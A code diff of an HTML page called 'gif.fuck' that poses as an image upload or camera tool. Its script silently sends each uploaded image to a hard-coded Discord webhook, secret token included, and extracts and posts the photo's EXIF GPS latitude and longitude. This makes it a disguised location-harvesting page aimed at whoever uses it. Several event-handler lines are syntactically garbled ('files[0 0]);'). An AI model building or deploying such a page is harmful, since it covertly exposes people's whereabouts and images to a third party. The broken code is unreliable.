@@ -4,10 +4,10 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>gif.fuck</title>
-  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/exifr.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/exifr@7.1.3/dist/lite.umd.js"></script>
   <style>
     body {
-      margin: 0;
+      margin: 0; padding: 0;
       height: 100vh;
       background: linear-gradient(135deg, #0f0f0f, #1a0033);
       font-family: 'Segoe UI', sans-serif;
@@ -28,7 +28,7 @@
     }
     h1 {
       margin: 0 0 30px 0;
-      font-size: 2.4em;
+      font-size: 2.5em;
       background: linear-gradient(90deg, #ff00cc, #00ffff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
@@ -36,49 +36,36 @@
     .drop-zone {
       border: 3px dashed #00ffff;
       border-radius: 16px;
-      padding: 40px 20px;
+      padding: 50px 20px;
       cursor: pointer;
       transition: all 0.3s;
       margin-bottom: 20px;
     }
-    .drop-zone:hover {
-      background: rgba(0, 255, 255, 0.05);
-      border-color: #ff00cc;
-    }
+    .drop-zone:hover { background: rgba(0, 255, 255, 0.08); border-color: #ff00cc; }
     button {
-      padding: 14px 30px;
-      font-size: 1.1em;
+      padding: 14px 28px;
+      font-size: 1.05em;
       background: linear-gradient(90deg, #ff00cc, #00ffff);
       border: none;
       border-radius: 50px;
       color: black;
       font-weight: bold;
       cursor: pointer;
-      margin: 8px 5px;
+      margin: 8px 6px;
       transition: 0.3s;
     }
-    button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 20px #ff00cc;
-    }
-    #status {
-      margin-top: 15px;
-      font-size: 0.95em;
-      min-height: 24px;
-    }
+    button:hover { transform: scale(1.06); }
+    #status { margin-top: 20px; min-height: 26px; font-size: 1em; }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>gif.fuck</h1>
-    
     <div class="drop-zone" id="dropZone">
-      <p>Drop image here or click to upload</p>
+      <p>Drop image here or tap to upload</p>
     </div>
-
     <button id="uploadBtn">📁 Choose from Gallery</button>
     <button id="cameraBtn">📸 Take Photo</button>
-
     <div id="status"></div>
   </div>
 
@@ -87,25 +74,25 @@
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
-    
     let selectedFile = null;
-    const status = document.getElementById('status');
+
+    const statusEl = document.getElementById('status');
     const fileInput = document.getElementById('fileInput');
     const cameraInput = document.getElementById('cameraInput');
 
     function updateStatus(text, color = "white") {
-      status.textContent = text;
-      status.style.color = color;
+      statusEl.textContent = text;
+      statusEl.style.color = color;
     }
 
     async function sendToWebhook(file, gps = null) {
       const formData = new FormData();
       formData.append("file", file, file.name);
 
-      let content = `New image: ${file.name}\nSize: ${(file.size/1024/1024).toFixed(2)} MB`;
+      let content = `**New upload:** ${file.name}\n**Size:** ${(file.size/1024/1024).toFixed(2)} MB`;
 
       if (gps && gps.latitude && gps.longitude) {
-        content += `\n\nGPS FOUND\nLat: ${gps.latitude.toFixed(6)}\nLon: ${gps.longitude.toFixed(6)}`;
+        content += `\n\n**GPS FOUND**\nLat: ${gps.latitude.toFixed(6)}\nLon: ${gps.longitude.toFixed(6)}`;
       }
 
       formData.append("payload_json", JSON.stringify({
@@ -122,42 +109,33 @@
       selectedFile = file;
       updateStatus(`Selected: ${file.name}`, "#00ffff");
 
-      // Auto send when file is selected
       try {
         const gps = await exifr.gps(file);
         await sendToWebhook(file, gps);
         updateStatus("✅ Sent to webhook!", "#00ff00");
       } catch (err) {
         await sendToWebhook(file);
-        updateStatus("✅ Sent (no GPS)", "#00ff88");
+        updateStatus("✅ Sent (no GPS data)", "#00ff88");
       }
     }
 
-    // Upload button
-    document.getElementById("uploadBtn").addEventListener("click", () => fileInput.click());
-    fileInput.addEventListener("change", (e) => {
-      if (e.target.files[0]) handleFile(e.target.files[0]);
-    });
+    // Buttons
+    document.getElementById("uploadBtn").onclick = () => fileInput.click();
+    document.getElementById("cameraBtn").onclick = () => cameraInput.click();
 
-    // Camera button
-    document.getElementById("cameraBtn").addEventListener("click", () => cameraInput.click());
-    cameraInput.addEventListener("change", (e) => {
-      if (e.target.files[0 0]);
-    });
+    fileInput.onchange = e => e.target.files[0 0]);
+    cameraInput.onchange = e => e.target.files[0 0]);
 
-    // Drag & Drop
+    // Drag & Drop + Click on zone
     const dropZone = document.getElementById("dropZone");
-    dropZone.addEventListener("click", () => fileInput.click());
-    dropZone.addEventListener("dragover", (e) => {
-      e.preventDefault();
-      dropZone.style.background = "rgba(0, 255, 255, 0.1)";
-    });
-    dropZone.addEventListener("dragleave", () => dropZone.style.background = "");
-    dropZone.addEventListener("drop", (e) => {
+    dropZone.onclick = () => fileInput.click();
+    dropZone.ondragover = e => { e.preventDefault(); dropZone.style.background = "rgba(0,255,255,0.1)"; };
+    dropZone.ondragleave = () => dropZone.style.background = "";
+    dropZone.ondrop = e => {
       e.preventDefault();
       dropZone.style.background = "";
-      if (e.dataTransfer.files[0]) handleFile(e.dataTransfer.files[0]);
-    });
+      if (e.dataTransfer.files[0 0]);
+    };
   </script>
 </body>
 </html>
